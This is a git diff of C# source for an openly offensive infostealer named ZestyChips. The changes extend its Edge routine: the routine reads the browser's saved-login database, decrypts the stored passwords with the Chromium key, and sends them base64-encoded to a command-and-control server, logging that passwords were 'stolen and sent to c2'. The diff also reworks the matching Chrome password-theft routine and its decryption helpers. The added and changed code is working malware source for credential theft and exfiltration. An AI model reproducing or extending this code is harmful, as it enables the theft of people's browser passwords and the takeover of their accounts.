@@ -7,9 +7,6 @@ using System.Security.Cryptography;
 using System.Linq;
 using System.Text;
 using System.Collections.Generic;
-using System.Security.Cryptography.X509Certificates;
-using System.Runtime.CompilerServices;
-using System.ComponentModel;
 
 namespace ZestyChips
 {
@@ -39,6 +36,7 @@ namespace ZestyChips
         private static string StealEdgeData() {
             string result = string.Empty;
             string loginDataLoc = "\\Microsoft\\Edge\\User Data\\Default\\Login Data";
+            string edgeFinalData = string.Empty;
 
             // two structures for saving our results into
             Dictionary<string, string> masterDictionary = new Dictionary<string, string>();
@@ -67,14 +65,13 @@ namespace ZestyChips
                 }
             }
 
-            SQLiteConnection sqliteConnection = new SQLiteConnection($"Data Source={filename}");
             try {
                 // connect to the db file and select data
+                SQLiteConnection sqliteConnection = new SQLiteConnection($"Data Source={filename}");
                 sqliteConnection.Open();
-                SQLiteCommand sqliteCommand = sqliteConnection.CreateCommand();
-                sqliteCommand.CommandText = "SELECT action_url, username_value, password_value FROM logins";
+                SQLiteCommand sqliteCommand = new SQLiteCommand("SELECT action_url, username_value, password_value FROM logins", sqliteConnection);
                 SQLiteDataReader sdr = sqliteCommand.ExecuteReader();
-
+                
                 // decypt password_value
                 byte[] key = GetChromiumEncryptionKey("/../Local/Microsoft/Edge/User Data/Local State");
                 while (sdr.Read()) {
@@ -99,11 +96,28 @@ namespace ZestyChips
                     ProcessAndFormatPasswords(decryptedPassword, actionURL, usernameValue, ref masterDictionary, decryptedOldStylePasswords, ref passwordResultsList);
                 }
 
+                    // if we have caught any errors above and have appended to the list
+                    // just return that list, it will be incomplete overall, but hopefully this 
+                    // shouldnt be a problem... todo
+                    // 9 times out of 10 this should never execute.
+                    // if you see "legacy edge passwords stolen" in your output, please reach out to Twitter @0xfluxsec and let me know.
+                    if(passwordResultsList.Count != 0) {
+                        edgeFinalData = JsonSerializer.Serialize(passwordResultsList);
+                        Program.SendBase64EncodedData(edgeFinalData); // send data off to c2
+                        Helpers.PrintSuccess("legacy edge passwords stolen and sent to c2.");
+                        return edgeFinalData;
+                    }
+
+                    edgeFinalData = JsonSerializer.Serialize(masterDictionary);
+                    Program.SendBase64EncodedData(edgeFinalData); // send data off to c2
+                    Helpers.PrintSuccess("edge passwords stolen and sent to c2.");
+                    return edgeFinalData;
 
             } catch (Exception ex) {
                 Helpers.PrintFail($"Error processing Edge data: {ex}");
             }
             
+            // if we reached here, something went wrong
             return result;
         }
 
@@ -212,78 +226,19 @@ namespace ZestyChips
                     // that it  doesnt  exist :)
                 }
 
-            //     string passwordResult = "";
-
-            //     if (decryptedPassword != "") {
-            //         string dict_site = actionURL.ToString();
-            //         string dict_user = usernameValue.ToString();
-
-            //         if (dict_site == "") {
-            //             dict_site = "Site URL not found"; // can't carve out some sites for some reason. E.g. reddit
-            //         }
-
-            //         if (masterDictionary.ContainsKey(dict_site)) {
-            //             Dictionary<string, string> dictionary2 = masterDictionary;
-            //             dictionary2[dict_site] = string.Concat(new string[] {
-            //                 dictionary2[dict_site],
-            //                 (dict_user != null) ? dict_user.ToString() : null,
-            //                 "|||",
-            //                 decryptedPassword,
-            //                 "; "
-            //             });
-            //         } else {
-            //             masterDictionary.Add(dict_site, ((dict_user != null) ? dict_user : null) + "|||" + decryptedPassword + "; ");
-            //         }
-            //     } else if (decryptedOldStylePasswords != "") {
-            //         // this section is untested, so given try catch
-            //         try {
-            //             string dict_site = actionURL.ToString();
-            //             string dict_user = usernameValue.ToString();
-
-            //             if (masterDictionary.ContainsKey(dict_site)) {
-            //                 Dictionary<string, string> dictionary2 = masterDictionary;
-            //                 dictionary2[dict_site] = string.Concat(new string[] {
-            //                     dictionary2[dict_site],
-            //                     (dict_user != null) ? dict_user.ToString() : null,
-            //                     "|||",
-            //                     decryptedPassword,
-            //                     "; "
-            //                 });
-            //             } else {
-            //                 masterDictionary.Add(dict_site, ((dict_user != null) ? dict_user : null) + "|||" + decryptedPassword + "; ");
-            //             }
-            //         } catch {
-            //             passwordResult = string.Concat(new string[]{
-            //                 passwordResult,
-            //                 (actionURL != null) ? actionURL.ToString() : null,
-            //                 " ",
-            //                 (usernameValue != null) ? usernameValue.ToString() : null,
-            //                 " ",
-            //                 decryptedOldStylePasswords,
-            //                 " 2\r\n"
-            //             });
-            //             passwordResultsList.Add(passwordResult);
-            //         }        
-            //     }
-            // }
-
+                // process the passwords ready to be sent to the server in a format of our choosing
                 ProcessAndFormatPasswords(decryptedPassword, actionURL, usernameValue, ref masterDictionary, decryptedOldStylePasswords, ref passwordResultsList);
             }
-            // cleanup
-            // sqliteConnection.Close();
-            // sdr.Close();
 
             // if we have caught any errors above and have appended to the list
             // just return that list, it will be incomplete overall, but hopefully this 
             // shouldnt be a problem... todo
             // 9 times out of 10 this should never execute.
+            // if you see "legacy chrome passwords stolen" in your output, please reach out to Twitter @0xfluxsec and let me know.
             if(passwordResultsList.Count != 0) {
+                Helpers.PrintSuccess("legacy chrome passwords stolen and sent to c2.");
                 return JsonSerializer.Serialize(passwordResultsList);
             }
-
-            // foreach (var pair in masterDictionary) {
-            //     Helpers.PrintSuccess($"Site: {pair.Key}, Value: {pair.Value}");
-            // }
 
             return JsonSerializer.Serialize(masterDictionary);
         }
@@ -312,27 +267,35 @@ namespace ZestyChips
         }
 
         private static void Aes256Prepare(byte[] encryptedData, out byte[] nonce, out byte[] ciphertextTag) {
-            nonce = new byte[12];
-            ciphertextTag = new byte[encryptedData.Length - 3 - nonce.Length];
-            Array.Copy(encryptedData, 3, nonce, 0, nonce.Length);
-            Array.Copy(encryptedData, 3 + nonce.Length, ciphertextTag, 0, ciphertextTag.Length);
+            try {
+                nonce = new byte[12];
+                ciphertextTag = new byte[encryptedData.Length - 3 - nonce.Length];
+                Array.Copy(encryptedData, 3, nonce, 0, nonce.Length);
+                Array.Copy(encryptedData, 3 + nonce.Length, ciphertextTag, 0, ciphertextTag.Length);
+            } catch (Exception ex){
+                Helpers.PrintFail($"error preparing ciphertext tag {ex.Message}");
+                nonce = null;
+                ciphertextTag = null;
+            }
         }
 
         private static byte[] GetBytesFromReader(SQLiteDataReader reader, int columnIndex)
         {
             // do not read past the end of the stream
-            if (!reader.IsDBNull(columnIndex))
-            {
-                long dataSize = reader.GetBytes(columnIndex, 0, null, 0, 0); // length of the data
-                byte[] data = new byte[dataSize];
+            try {
+                if (!reader.IsDBNull(columnIndex)) {
+                    long dataSize = reader.GetBytes(columnIndex, 0, null, 0, 0); // length of the data
+                    byte[] data = new byte[dataSize];
 
-                long bytesRead = reader.GetBytes(columnIndex, 0, data, 0, data.Length);
-                if (bytesRead != dataSize)
-                {
-                    throw new InvalidOperationException("Data size mismatch");
+                    long bytesRead = reader.GetBytes(columnIndex, 0, data, 0, data.Length);
+                    if (bytesRead != dataSize) {
+                        throw new InvalidOperationException("Data size mismatch");
+                    }
+
+                    return data;
                 }
-
-                return data;
+            } catch {
+                Helpers.PrintFail("failed getting bytes from SQLiteDataReader");
             }
 
             return null;
